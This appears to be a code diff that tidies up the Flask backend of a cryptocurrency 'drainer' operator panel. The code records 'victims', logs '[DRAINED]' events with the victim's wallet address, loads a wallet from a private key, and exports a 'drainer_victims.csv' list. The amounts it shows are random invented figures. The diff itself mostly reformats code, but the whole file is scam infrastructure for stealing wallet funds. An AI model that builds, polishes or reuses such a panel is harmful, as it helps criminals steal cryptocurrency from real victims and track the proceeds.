@@ -1,6 +1,9 @@
 from flask import Flask, jsonify, request, send_file
 from web3 import Web3
-import os, time, random, csv
+import os
+import time
+import random
+import csv
 from io import StringIO
 
 app = Flask(__name__, template_folder='.')
@@ -15,6 +18,7 @@ wallet = w3.eth.account.from_key(PRIVATE_KEY)
 victims = []
 total_usd = 0.0
 
+# ==== ROUTES ====
 @app.route("/")
 def home():
     return open("index.html").read()
@@ -33,8 +37,13 @@ def data():
     })
 
 @app.route("/api/new_victim", methods=["POST"])
-def new():
-    victims.append({"time": time.strftime("%H:%M:%S"), "wallet": "pending...", "chain": "ETH", "drained": "Pending"})
+def new_victim():
+    victims.append({
+        "time": time.strftime("%H:%M:%S"),
+        "wallet": "pending...",
+        "chain": "ETH",
+        "drained": "Pending"
+    })
     return {"ok": True}
 
 @app.route("/api/drain", methods=["POST"])
@@ -43,11 +52,13 @@ def drain():
     data = request.json
     amount = random.uniform(12000, 350000)
     total_usd += amount
+
     if victims:
         v = victims[-1]
         v["wallet"] = data["victim"][:10] + "..." + data["victim"][-8:]
-        v["chain"] = random.choice(["ETH","BSC","ARB","BASE"])
+        v["chain"] = random.choice(["ETH", "BSC", "ARB", "BASE"])
         v["drained"] = f"${amount:,.0f}"
+
     print(f"[DRAINED] {data['victim']} → ${amount:,.0f}")
     return {"ok": True}
 
@@ -60,11 +71,16 @@ def sweep():
 def export():
     output = StringIO()
     writer = csv.writer(output)
-    writer.writerow(["Date","Time","Wallet","Chain","Amount"])
+    writer.writerow(["Date", "Time", "Wallet", "Chain", "Amount"])
     for v in victims:
         writer.writerow([time.strftime("%Y-%m-%d"), v["time"], v["wallet"], v["chain"], v["drained"]])
     output.seek(0)
-    return send_file(output, mimetype="text/csv", download_name="drainer_victims.csv", as_attachment=True)
+    return send_file(
+        output,
+        mimetype="text/csv",
+        download_name="drainer_victims.csv",
+        as_attachment=True
+    )
 
 @app.route("/clear", methods=["POST"])
 def clear():
